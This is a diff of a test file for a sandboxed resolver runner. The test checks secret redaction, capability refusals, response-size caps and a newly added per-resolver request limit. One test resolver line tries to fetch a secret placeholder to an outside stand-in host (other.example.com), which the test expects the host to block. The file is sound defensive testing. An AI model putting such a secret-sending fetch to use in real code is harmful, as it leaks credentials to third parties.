@@ -46,7 +46,7 @@ it('the host fills secrets, the resolver never sees a value, and a 2 MiB respons
  const runner=await createRunner({dockerImage:process.env.RUNNER_TEST_IMAGE,db,capabilities:async(context,operation,args)=>pageBackendCapability(context.request,operation,args,async()=>record,async(_backend,name)=>name==='KEY'?KEY:Promise.reject(Error('backend_secret_unavailable')),createResolverFetch({policy:{allowPrivate:true,allowHttp:true}}),{query,sql})});
  try{
   const base=`http://api.localhost:${server.port}`;
-  const source=`export const secrets={KEY:"api.localhost"}; export const typeDefs="type Query { probe: String! size: Int! }"; export default {
+  const source=`export const secrets={KEY:"api.localhost"}; export const typeDefs="type Query { probe: String! size: Int! many: String! }"; export default {
    probe: async(args,principal,caps)=>{
     const seen={keys:Object.keys(caps),named:typeof caps["sec"+"rets"],role:principal.role};
     seen.query=await caps.query("{ staff { name } }",{team:"red"});
@@ -62,7 +62,8 @@ it('the host fills secrets, the resolver never sees a value, and a 2 MiB respons
     seen.refused=await caps.fetch("https://other.example.com/?k={{KEY}}").then(()=>"sent",e=>e.message);
     return JSON.stringify(seen);
    },
-   size: async(args,principal,caps)=>(await (await caps.fetch("${base}/fits")).text()).length };`;
+   size: async(args,principal,caps)=>(await (await caps.fetch("${base}/fits")).text()).length,
+   many: async(args,principal,caps)=>{let ok=0;try{for(let i=0;i<40;i++){await caps.sql("SELECT 1");ok++;}}catch(e){return ok+" "+e.message;}return ok+" unbounded";} };`;
   record={...(await createBackendCompiler(runner)(source)),source,backendId:'backend2',pageId:'page1',version:'v1',ownerId:'owner1'};
   expect(record).toMatchObject({secretHosts:{KEY:'api.localhost'}});
   const invoke=createBackendInvoker(runner,async()=>record);
@@ -79,6 +80,8 @@ it('the host fills secrets, the resolver never sees a value, and a 2 MiB respons
    queryError:['permission_denied','a dataset mutation runs only inside a mutation resolver'],direct:'backend_capability_forbidden',store:'backend_capability_forbidden',
    response:{ok:true,status:200,url:`${base}/echo?k=[redacted]`,headers:expect.objectContaining({'x-echo':'Bearer [redacted]'}),text:JSON.stringify({url:'/echo?k=[redacted]',authorization:'Bearer [redacted]'})},refused:'secret_host_forbidden: KEY'});
   expect(await invoke({...call,field:'size'})).toBe(RESOLVER_LIMITS.fetchResponseBytes);
+  // Each caps.sql call is one of the resolver's requests.
+  expect(await invoke({...call,field:'many'})).toBe(`${RESOLVER_LIMITS.maxRequests} request_limit`);
   const receipts=(await db.query<{receipt:import('@artifactbin/contracts').RunReceipt}>('SELECT receipt FROM runner_runs')).rows.flatMap(row=>row.receipt?.requests??[]).filter(r=>r.service==='fetch');
   expect(receipts).toContainEqual(expect.objectContaining({status:200,fetch:{method:'POST',host:'api.localhost',path:'/echo',bytesIn:expect.any(Number),bytesOut:Buffer.byteLength(KEY),secrets:['KEY']}}));
   expect(JSON.stringify(receipts)).not.toMatch(/k=|Bearer|s3cr3t/);
